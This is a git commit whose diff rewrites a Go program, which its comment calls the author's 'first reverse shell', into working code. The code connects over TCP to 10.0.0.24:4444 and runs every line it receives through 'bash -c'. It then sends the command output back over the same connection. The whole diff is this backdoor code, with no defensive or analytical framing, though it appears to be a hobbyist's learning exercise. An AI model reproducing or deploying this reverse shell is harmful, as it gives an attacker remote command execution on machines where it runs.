7d179a5ef504ac90a590b775f87d1316ca84cdfb
ipatchcables <30351225+ipatchcables@users.noreply.github.com>
2019-04-26 10:35:04 -0400

    Update main.go
    Got it to work, original code was all borked.

--- shell/main.go
+++ shell/main.go
@@ -1,13 +1,30 @@
+//this is my first reverse shell written in go lang
 package main
 
 import (
+	"bufio"
+	"fmt"
 	"log"
 	"net"
+	"os/exec"
 )
 
 func main() {
-	conn, err := net.Dial("tcp", "127.0.0.1:4444") //Send Dial connection to specified ip and port 	 use netcat to test - it works
-	log.Fatal(conn, err)                           // log the conn or err to console
-	conn.Close()                                   // Close the connection
+	shell("10.0.0.24:4444")
+}
 
+func shell(host string) {
+	conn, err := net.Dial("tcp", host)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	for {
+		message, _ := bufio.NewReader(conn).ReadString('\n')
+		out, err := exec.Command("bash", "-c", message).CombinedOutput()
+		if err != nil {
+			fmt.Println(err)
+		}
+		conn.Write(out)
+	}
 }
